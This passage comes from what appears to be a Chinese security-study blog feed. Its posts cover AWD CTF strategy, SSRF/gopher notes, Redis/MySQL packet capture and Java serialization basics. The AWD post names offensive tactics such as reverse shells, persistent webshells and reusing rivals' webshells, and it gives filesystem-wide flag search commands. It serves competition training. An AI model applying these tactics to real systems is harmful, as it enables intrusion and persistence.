的任意文件读取，即可得到 flag。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>AWD入门12问</title>
      <link href="88e5b482994b/"/>
      <url>88e5b482994b/</url>
      
        <content type="html"><![CDATA[<p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210506094146.png"></p><p>（图片说明：AWD需要抢时间，提前进行充分的准备，尽量能使用脚本一键利用，而不是像解题模式慢慢的测试）</p><h2 id="0x01-AWD是什么？AWD比赛形式是怎样的？"><a href="#0x01-AWD是什么？AWD比赛形式是怎样的？" class="headerlink" title="0x01 AWD是什么？AWD比赛形式是怎样的？"></a>0x01 AWD是什么？AWD比赛形式是怎样的？</h2><p>AWD的全称是Attack With Defense，攻击成功会得分，但是如果被别人攻击就会扣分（防守弱）。</p><p>AWD的一般流程：</p><ol><li>出题方会给每支队伍部署「相同」环境的机器。</li><li>拿到机器后，每支队伍会有加固时间或者没有加固时间，具体看比赛举办方。</li><li>每个服务，数据库，主机上都存在flag，定时刷新。通过攻击拿到flag之后，一般会提供指定的接口，下一次刷新之后，如果还存在该漏洞，可以继续利用该漏洞拿分。<blockquote><p><del>需要提交 flag 的脚本</del>（现场写吧，规则很可能不同）</p></blockquote></li></ol><hr><h2 id="0x02-AWD需要哪些基础知识？"><a href="#0x02-AWD需要哪些基础知识？" class="headerlink" title="0x02 AWD需要哪些基础知识？"></a>0x02 AWD需要哪些基础知识？</h2><p>防御</p><ol><li>流量回放：通过分析对方的攻击流量，知道自己的弱点，知道对方的弱点（可能对方没来得及加固）</li><li>Linux相关：WAF的使用，修复漏洞。</li></ol><p>Web攻击</p><ol><li>Web漏洞（针对不同服务，不一定是Web）</li><li>内网渗透（时间长的比赛需要）<blockquote><p>基本流程：信息收集、攻击端口、攻击Web服务、维持权限。（手快才是关键，🐶）</p></blockquote></li></ol><p>重点在于代码审计、自动化脚本编写的能力。</p><h2 id="0x03-队员应该怎么分工？"><a href="#0x03-队员应该怎么分工？" class="headerlink" title="0x03 队员应该怎么分工？"></a>0x03 队员应该怎么分工？</h2><p>大致可以分为攻击和防守。</p><p>负责两个方面：</p><ul><li>一方面负责防守加固、做基线、加WAF、流量回放等等。</li><li>一方面负责源码审计、写攻击脚本、维持权限、持续渗透，具体怎么安排都视三人能力而定。<blockquote><p>需要准备一些脚本、常见的命令。</p></blockquote></li></ul><h2 id="0x04-流程大致是怎样的？"><a href="#0x04-流程大致是怎样的？" class="headerlink" title="0x04 流程大致是怎样的？"></a>0x04 流程大致是怎样的？</h2><h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>a.信息收集</p><ol><li>探测主机。利用nmap确认存活主机的IP，搞清楚网络拓扑。</li><li>探测端口。确认主机之后，探测端口。（也可以看自己的机器开了什么端口，所有的机器都是一样的）</li><li>探测端口服务。可以使用nmap扫描相关的漏洞（或者msf）。<blockquote><p>需要准备nmap相关的命令。</p><ul><li>扫描端口</li><li>扫描漏洞</li></ul></blockquote></li></ol><p>b.攻击端口</p><ol><li>弱密码攻击常见端口。</li><li>扫描端口存在的服务，是否存在漏洞。<blockquote><p>需要准备弱密码字典。</p></blockquote></li></ol><p>c. 攻击服务</p><ol><li>使用D盾等WAF查杀后门或WebShell，将自己电脑中的后门先关闭。</li><li>使用源码审计工具审核出比较明显的漏洞。（seay）</li><li>最后再尝试绕过文件上传、SQL注入、反序列化。<blockquote><p>需要再电脑中准备好 exp 库、漏洞库、各种扫描工具。</p></blockquote></li></ol><p>d. 权限维持</p><ol><li>反弹shell</li><li>不死马（不好不要直接用Webshell）<blockquote><p>需要了解一下权限维持相关的技术，以及脚本准备。</p></blockquote></li></ol><p>快速找 flag：</p><ol><li><code>tac `find / -iname flag*`</code></li><li><code>find / -name *flag*</code></li><li><code>grep -rn &quot;flag&quot; *</code></li></ol><h3 id="防御流程"><a href="#防御流程" class="headerlink" title="防御流程"></a>防御流程</h3><p>a. 让网站保持稳定。</p><ol><li>备份源码。</li><li>备份数据库。<blockquote><p>需要准备备份数据库、备份源码相关的命令。</p></blockquote></li></ol><p>b. 系统安全检查</p><ol><li>修改ssh、mysql的弱密码</li><li>关闭不该开启的端口<blockquote><p>准备相关安全检查的脚本。</p></blockquote></li></ol><p>c. 部署WAF</p><ol><li>部署WAF</li><li>验证WAF是否可用<blockquote><p>需要准备WAF相关的源码，以及部署相关的脚本。</p></blockquote></li></ol><p>d. 修改权限</p><ol><li>上传目录的执行权限。</li><li>MySQL不允许写文件。</li></ol><p>e. 部署文件监控脚本</p><ol><li>监控可读写的文件是否新增或者删除文件。</li></ol><p>f. 部署流量监控脚本，开启服务器日志记录。</p><ol><li>监控流量。</li><li>分析对方是如何攻击自己的。</li><li>用类似的手段攻击其他机器。（注意混淆流量）</li></ol><h2 id="0x05-有哪些需要注意的事情？"><a href="#0x05-有哪些需要注意的事情？" class="headerlink" title="0x05 有哪些需要注意的事情？"></a>0x05 有哪些需要注意的事情？</h2><ol><li>准备脚本。</li><li>优化攻击和防御流程。<blockquote><p>其他基础都在于平时的积累。</p></blockquote></li></ol><h2 id="0x6-Web狗需要具备的能力有哪些？"><a href="#0x6-Web狗需要具备的能力有哪些？" class="headerlink" title="0x6 Web狗需要具备的能力有哪些？"></a>0x6 Web狗需要具备的能力有哪些？</h2><ol><li>快速漏洞的反应能力。</li><li>快速编写脚本的能力。</li><li>一个好的心态。</li></ol><h2 id="0x07-当处于劣势时，应该怎么做？"><a href="#0x07-当处于劣势时，应该怎么做？" class="headerlink" title="0x07 当处于劣势时，应该怎么做？"></a>0x07 当处于劣势时，应该怎么做？</h2><ol><li>首先心态不要崩</li><li>抓流量，分析其他队伍的Payload，进行反打。</li><li>如果被种Webshell，那么可能其他机器也有Webshell，密码也一样，可以借机潜入。</li></ol><h2 id="0x08-如何防守？"><a href="#0x08-如何防守？" class="headerlink" title="0x08 如何防守？"></a>0x08 如何防守？</h2><p>在问题四中已经说过，主要关注以下几点：</p><ol><li>保护机器的稳定。</li><li>保持无后门。</li><li>分析流量。</li></ol><h2 id="0x09-有什么比较好的AWD框架？"><a href="#0x09-有什么比较好的AWD框架？" class="headerlink" title="0x09 有什么比较好的AWD框架？"></a>0x09 有什么比较好的AWD框架？</h2><p>逛了一圈，最完善的AWD框架已经被喝茶，停止更新，估计有很多问题。</p><ol><li><a href="https://github.com/SniperOJ/Attack-Defense-Framework">https://github.com/SniperOJ/Attack-Defense-Framework</a></li></ol><h2 id="0x10-D盾是什么？有没有更好的替代品？"><a href="#0x10-D盾是什么？有没有更好的替代品？" class="headerlink" title="0x10 D盾是什么？有没有更好的替代品？"></a>0x10 D盾是什么？有没有更好的替代品？</h2><p>D盾是一种Web后门查杀工具，能查找隐藏在Linux中的Web后门。</p><p>已经下载，感觉还不错。</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210506191701.png"><br>在虚拟机中扫描后就卡了，算了，重新找个吧。</p><p>没找到替代品，文件少点就不会卡。</p><h2 id="0x11-awd怎么上WAF？上什么WAF？"><a href="#0x11-awd怎么上WAF？上什么WAF？" class="headerlink" title="0x11 awd怎么上WAF？上什么WAF？"></a>0x11 awd怎么上WAF？上什么WAF？</h2><p>WAF：</p><ul><li>AoiAWD：推荐。<a href="https://github.com/DasSecurity-HatLab/AoiAWD">https://github.com/DasSecurity-HatLab/AoiAWD</a></li><li>awd-watchbird</li></ul><p>配置教程：</p><ol><li>AoiAWD：<a href="https://www.cnblogs.com/stayelegance/p/14393260.html">https://www.cnblogs.com/stayelegance/p/14393260.html</a><br>（没有实战经验）</li></ol><h2 id="0x12-了解完上面的基础知识应该做什么？"><a href="#0x12-了解完上面的基础知识应该做什么？" class="headerlink" title="0x12 了解完上面的基础知识应该做什么？"></a>0x12 了解完上面的基础知识应该做什么？</h2><p>找个靶场，尝试一下，毕竟在拼速度，肯定是亲自做过会更快，更容易拿分。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>博客新见解：发布即完结</title>
      <link href="9c416611969b/"/>
      <url>9c416611969b/</url>
      
        <content type="html"><![CDATA[<p>发布即完结。也就是，当文章发布后，这篇博客就不能进行修改。</p><blockquote><p>最理想的情况是不做任何的修改。不过如果有错别字或者其他问题，可以考虑进行微调（不要纵容自己）或者进行适当的补充。</p></blockquote><p>PS：我并没有对这个想法进行尝试，只是期望自己以后能以这种方式写博客。</p><hr><h1 id="1-原因"><a href="#1-原因" class="headerlink" title="1 原因"></a>1 原因</h1><p>下面我将阐述期望这么做的几个原因：</p><p><strong>原因 1：增强写博客的正反馈</strong></p><p>我深知，需要养成习惯，必须要重视正反馈。博客通常是通过阅读量、发布的文章数、评论等数据来获得的正反馈。</p><ul><li>发布的文章数比较多，看到满满的成果，自己会觉得非常安心，正反馈++。</li><li>自己写的文章受到别人的好评，正反馈++。</li><li>阅读量增加，正反馈++。</li></ul><p><strong>原因 2：降低写作压力，提高写作兴趣</strong>。</p><p>在前面几篇博客中，我都是按照「笔记」的方式来记录博客。这样的记录方法，可以将相关的知识点都放在同一篇博文下，便于自己查看相关的笔记。但这样记录也会有很多弊端，历史博客和新博文写在同一篇文章下，各种内容混杂难以排版，阅读体验差。如果要对以前的博文进行修改，又要进行无用的修改，会增加写作的压力。</p><p>所以我现在打算摒弃以前博客的写法。当文章发布的时候，就只会进行小幅度的修改。</p><p><strong>原因 3：提高博客文章的质量</strong></p><p>“发布即完结”</p><ul><li>需要取一个较好的文章标题，来让自己或别人快速理解整篇文章的内容。</li><li>需要在文章发布之前做比较细致的检查。如：错别字、格式排版，各种各样增强阅读体验的修改。</li></ul><hr><h1 id="2-实施"><a href="#2-实施" class="headerlink" title="2 实施"></a>2 实施</h1><ol><li><strong>创建草稿</strong></li></ol><p>Hexo 提供了 draft 的布局，当使用下面的命令行生成新的文章时，文章便会放到 <code>_drafts</code> 文件夹中。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new draft <span class="string">&quot;博客新见解：发布即成品&quot;</span></span><br></pre></td></tr></table></figure><p><code>_drafts</code>相当于一个工作区域，保存自己当前正在写的文章。当写完文章之后，使用 <code>publish</code> 命令即可移动到<code>_posts</code>目录中，发布后的文章不再干扰后续的写作。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210418161324.png"></p><ol start="3"><li><strong>使用工具检查文章的错误</strong>（是否符合排版规范）</li></ol><p>我暂时采用 <a href="https://marketplace.visualstudio.com/items?itemName=ZhixiangZhang.mdlint#review-details">vscode 的检查插件</a>。</p><ol start="4"><li><strong>自己再次阅读</strong></li></ol><ul><li>逐字阅读。</li><li>放一段时间再读一遍。</li></ul><blockquote><p>做个有要求的博主。</p></blockquote><ol start="5"><li><strong>发布文章</strong></li></ol><p>使用下面的命令将自己的草稿进行发布。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo publish draft <span class="string">&quot;博客新见解：发布即成品&quot;</span></span><br></pre></td></tr></table></figure><p>那什么时候是一篇文章完结呢？将自己当前想表达的思想充分表达，这篇文章就可以进行收尾工作了。以后想表达类似的思想，可以考虑添加超链接。</p><ol start="6"><li><strong>等待评论以及回复评论</strong>（公开）</li></ol><hr>]]></content>
      
      
      <categories>
          
          <category> 经验分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【网络空间安全】服务器端请求伪造笔记（SSRF）</title>
      <link href="e66d3ad04164/"/>
      <url>e66d3ad04164/</url>
      
        <content type="html"><![CDATA[<p>我曾经在阅读《Web安全攻防》是摘录过一些SSRF的笔记，不过我觉得博客还是要写出自己的思考和经验才好。</p><blockquote><p>况且我现在正在统一自己的写作风格，采用问答的方式，仅提供关键思路，而不是教科书式的一步一步的写。</p></blockquote><h1 id="1-协议"><a href="#1-协议" class="headerlink" title="1 协议"></a>1 协议</h1><h2 id="0x01-gopher协议是什么？有什么用？"><a href="#0x01-gopher协议是什么？有什么用？" class="headerlink" title="0x01 gopher协议是什么？有什么用？"></a>0x01 gopher协议是什么？有什么用？</h2><p>gopher协议就像是是HTTP协议的前身，所以很多HTTP能做到的事情，gopher也能做到。</p><p>SSRF能利用这个协议拓展攻击面，如：</p><ul><li>发送GET请求</li><li>发送POST请求<br>使用上面的方法可以做到很多事情。</li><li>探测内网IP和端口</li><li>攻击内网的网站</li><li>攻击内网redis、memcache、mysql、fastcgi或其他服务</li></ul><h2 id="0x02-gopher协议怎么发送GET？"><a href="#0x02-gopher协议怎么发送GET？" class="headerlink" title="0x02 gopher协议怎么发送GET？"></a>0x02 gopher协议怎么发送GET？</h2><h2 id="0x03-gopher协议怎么发送POST？"><a href="#0x03-gopher协议怎么发送POST？" class="headerlink" title="0x03 gopher协议怎么发送POST？"></a>0x03 gopher协议怎么发送POST？</h2><h2 id="0x03-gopher协议怎么攻击redis？"><a href="#0x03-gopher协议怎么攻击redis？" class="headerlink" title="0x03 gopher协议怎么攻击redis？"></a>0x03 gopher协议怎么攻击redis？</h2>]]></content>
      
      
      <categories>
          
          <category> 网络空间安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssrf </tag>
            
            <tag> gopher </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【计算机基础】网络抓包分析笔记</title>
      <link href="d1b122c9a430/"/>
      <url>d1b122c9a430/</url>
      
        <content type="html"><![CDATA[<p>在SSRF中经常会用到Gopher协议或者其他协议，来对内网的服务进行攻击。在使用Gopher协议的时候，我们需要将其他服务的数据包进行重放（使用Gopher协议重放）。</p><p>这也就意味着必须通过抓包来获得其他服务（MySQL、Redis）的数据包。</p><h1 id="1-抓包"><a href="#1-抓包" class="headerlink" title="1 抓包"></a>1 抓包</h1><h2 id="0x01-如何抓Redis的数据包？"><a href="#0x01-如何抓Redis的数据包？" class="headerlink" title="0x01 如何抓Redis的数据包？"></a>0x01 如何抓Redis的数据包？</h2><p>当redis在本地时，需要抓取ol相关的网络接口（本地回环包），可以使用下面的命令找到相关的设备名：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig -a</span><br></pre></td></tr></table></figure><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210404193614.png"><br>（图片说明：lo0就是我的电脑的本地回环接口，即Loop back address）</p><p>使用socat进行端口转发。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat -v tcp-listen:4444,fork tcp-connect:localhost:6379</span><br></pre></td></tr></table></figure><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210404194207.png"><br>（图片说明：打开另一个窗口，使用redis-cli和redis进行交互，即可抓到上图的数据包，第一个命令是<code>keys *</code>）</p><p>如果比较熟悉wireshark，可以考虑采用tcpdump。命令可能类似下面的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i lo0 port 4444 -w mysql.pcapng</span><br></pre></td></tr></table></figure><p>（ps：记得将上面的设备换成自己的本地回环接口，可能是ol）</p><h2 id="0x02-如何抓MySQL的数据包？"><a href="#0x02-如何抓MySQL的数据包？" class="headerlink" title="0x02 如何抓MySQL的数据包？"></a>0x02 如何抓MySQL的数据包？</h2><p>大部分的步骤都和redis相似。</p><p>MySQL的数据包有一个比较坑的点：mysql命令可能使用mysql.sock文件和数据库进行交互，而不是tcp。所以可能使用tcpdump抓不到包。</p><p>具体解决办法：指定host和port，使用下面的命令进行登陆</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -h 127.0.0.1 -P 3306</span><br></pre></td></tr></table></figure><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210404194739.png"><br>（图片说明：使用 -P（大P）来指定端口）</p><h1 id="2-分析"><a href="#2-分析" class="headerlink" title="2 分析"></a>2 分析</h1><h2 id="0x01-如何快速获得所有请求包的二进制？"><a href="#0x01-如何快速获得所有请求包的二进制？" class="headerlink" title="0x01 如何快速获得所有请求包的二进制？"></a>0x01 如何快速获得所有请求包的二进制？</h2><p>（获得数据包二进制码相当于获得了请求包文件）</p><p>拿到流量包，随便选一个包，追踪TCP流。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210404195209.png"><br>（图片说明：打开pcapng的流量包）<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210404195237.png"><br>（图片说明：注意下方的红色标注，选中后即可获得所有数据包的二进制数据）</p><h1 id="附录"><a href="#附录" class="headerlink" title="#附录"></a>#附录</h1><p>参考教程：</p><ol><li>利用gopher协议攻击(生成gopher协议payload)：<a href="https://blog.szfszf.top/article/9/">https://blog.szfszf.top/article/9/</a></li><li>Gopher SSRF攻击内网应用复现：<a href="https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/">https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/</a></li><li>SSRF攻击MySQL：<a href="https://coomrade.github.io/2018/10/28/SSRF%E6%94%BB%E5%87%BBMySQL/">https://coomrade.github.io/2018/10/28/SSRF%E6%94%BB%E5%87%BBMySQL/</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wireshark </tag>
            
            <tag> socat </tag>
            
            <tag> tcpdump </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【计算机基础】Java审计基础学习</title>
      <link href="10aa19681a6d/"/>
      <url>10aa19681a6d/</url>
      
        <content type="html"><![CDATA[<p>最近开始尝试进行 Java 代码审计，但是很多 Java 方面的基础概念不太够。开始逐渐补一补 Java 的基础。</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210325162534.png"></p><h1 id="1-Java-基础"><a href="#1-Java-基础" class="headerlink" title="1 Java 基础"></a>1 Java 基础</h1><h2 id="0x01-Java-SE、Java-EE、Java-ME有何关系？"><a href="#0x01-Java-SE、Java-EE、Java-ME有何关系？" class="headerlink" title="0x01 Java SE、Java EE、Java ME有何关系？"></a>0x01 Java SE、Java EE、Java ME有何关系？</h2><p>简单来说，Java SE就是标准版，包含标准的JVM和标准库，而Java EE是企业版，它只是在Java SE的基础上加上了大量的API和库，以便方便开发Web应用、数据库、消息服务等，Java EE的应用使用的虚拟机和Java SE完全相同。</p><p>Java ME就和Java SE不同，它是一个针对嵌入式设备的“瘦身版”，Java SE的标准库无法在Java ME上使用，Java ME的虚拟机也是“瘦身版”。</p><p>根本区别：</p><ol><li>标准库不同</li><li>出发点不同。</li></ol><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210325192543.png"><br>（图片说明：Java EE&gt;Java SE&gt;Java ME）</p><h2 id="0x02-如何寻找合适的-Java-版本？"><a href="#0x02-如何寻找合适的-Java-版本？" class="headerlink" title="0x02 如何寻找合适的 Java 版本？"></a>0x02 如何寻找合适的 Java 版本？</h2><p>有些人说 Java 1.8，有些人说 Java 8.0。如果想要正确的下载 Java 版本，就需要使用到下面的表格：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210325192952.png"></p><h2 id="0x03-JDK-和-JRE-是什么？"><a href="#0x03-JDK-和-JRE-是什么？" class="headerlink" title="0x03 JDK 和 JRE 是什么？"></a>0x03 JDK 和 JRE 是什么？</h2><ul><li>JDK：Java Development Kit</li><li>JRE：Java Runtime Environment</li></ul><p>简单地说，JRE就是运行Java字节码的虚拟机（运行 Java 程序的必须条件）。但是，如果只有Java源码，要编译成Java字节码，就需要JDK，因为JDK除了包含JRE，还提供了编译器、调试器等开发工具。</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210325193819.png"><br>（图片说明：JDK&gt;JRE&gt;JVM）</p><h2 id="0x04-JDK-中可用的命令行工具有哪些？"><a href="#0x04-JDK-中可用的命令行工具有哪些？" class="headerlink" title="0x04 JDK 中可用的命令行工具有哪些？"></a>0x04 JDK 中可用的命令行工具有哪些？</h2><ul><li>java：这个可执行程序其实就是JVM，运行Java程序，就是启动JVM，然后让JVM执行指定的编译后的代码；</li><li>javac：这是Java的编译器，它用于把Java源码文件（以.java后缀结尾）编译为Java字节码文件（以.class后缀结尾）；</li><li>jar：用于把一组.class文件打包成一个.jar文件，便于发布；</li><li>javadoc：用于从Java源码中自动提取注释并生成文档；</li><li>jdb：Java调试器，用于开发阶段的运行调试。</li></ul><h2 id="0x05-main-方法为什么那么丑？"><a href="#0x05-main-方法为什么那么丑？" class="headerlink" title="0x05 main 方法为什么那么丑？"></a>0x05 main 方法为什么那么丑？</h2><p> C 语言的 Hello World<br> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="comment">// printf() 中字符串需要引号</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Hello, World!&quot;</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p> Java 的 Hello World<br> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello, world!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>从上面可以看出，Java 的 main 方法前缀太长了。</p><p>Java 的一切皆对象的思想贯穿 Java 的整个语言生态，Hello world 也必须要使用类相关的思想。</p><p>在面向对象中，所有的函数都必须要使用访问修饰符来进行修饰，这里的 main 必须是共有才能被外部所调用。</p><p>如果把函数成员声明为静态的，就可以把函数与类的任何特定对象独立开来。也就是 <code>static</code> 修饰符可以让 main 函数不用创建对象就能被调用（不会违反类的基本特性）。</p><p><code>string[] args</code> 就是 Java 中规定的，必须要遵守的，都需要传参。</p><h2 id="0x06-Java-如何反序列化？"><a href="#0x06-Java-如何反序列化？" class="headerlink" title="0x06 Java 如何反序列化？"></a>0x06 Java 如何反序列化？</h2><p>对象序列化是指将「内存中保存的对象」以二进制数据流的形式进行处理以便实现对象的传输或储存。摘录一段廖雪峰对于序列化的描述：</p><blockquote><p>序列化是指把一个 <strong>Java 对象变成二进制内容</strong>，二进制本质上就是一个 byte[] 数组。<br>为什么要把Java对象序列化呢？因为序列化后可以把byte[]保存到文件中，或者把byte[]通过网络传输到远程，这样，就相当于把Java对象存储到文件或者通过网络传输出去了。</p></blockquote><p>Java 的序列化机制仅适用于 Java，如果需要与其它语言交换数据，必须使用通用的序列化方法，例如 JSON。不过，JSON只输出基本类型（包括String）的内容，而不存储任何与代码相关的信息。</p><p>序列化步骤：</p><ol><li>基本类型，如int，boolean，String（以UTF-8编码）可以使用 <code>ObjectOutputStream.writeObject</code> 函数直接序列化。</li><li>Java 类需要实现 Serializable 接口</li></ol><p>反序列化步骤：</p><ol><li>使用 <code>ObjectInputStream.readObject</code> 函数进行反序列化</li></ol><p>下面是一段简单的代码演示如何进行Java对象的序列化以及反序列化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;serial&quot;)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;<span class="comment">//可以被序列化的Person类</span></span><br><span class="line"><span class="comment">//如果加上transient关键字的话序列化时会忽略这个属性</span></span><br><span class="line"><span class="keyword">private</span> String name;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**   </span></span><br><span class="line"><span class="comment">* 创建人的对象</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> name</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> age  </span></span><br><span class="line"><span class="comment">*/</span>  </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.name = name;</span><br><span class="line"><span class="keyword">this</span>.age = age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;姓名: &quot;</span> + name + <span class="string">&quot;、年龄: &quot;</span> + age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * 所谓的序列化就是二进制数据流的处理</span></span><br><span class="line"><span class="comment">* <span class="doctag">@ClassName</span>: Baby_Serializable  </span></span><br><span class="line"><span class="comment">* <span class="doctag">@Author</span>: flo@t</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Baby_Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> File SAVE_FILE = <span class="keyword">new</span> File(<span class="string">&quot;serial.Person&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment">* <span class="doctag">@Title</span>: main  </span></span><br><span class="line"><span class="comment">* <span class="doctag">@Description</span>: 序列化和反序列化的操作可由ObjectOutputStream和ObjectInputStream两个类来实现</span></span><br><span class="line"><span class="comment">* ObjectOutputStream: 是OutputStream子类，接受一个OutputStream类对象</span></span><br><span class="line"><span class="comment">* ObjectInputStream: 是InputStream子类，接受一个InputStream类对象</span></span><br><span class="line"><span class="comment">* 序列化方法：writeObject()</span></span><br><span class="line"><span class="comment">* 反序列化方法：readObject()</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">saveObject(<span class="keyword">new</span> Person(<span class="string">&quot;小米&quot;</span>, <span class="number">18</span>));<span class="comment">//序列化</span></span><br><span class="line">System.out.println(loadObject());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span>  <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">saveObject</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(SAVE_FILE));</span><br><span class="line">os.writeObject(obj);  <span 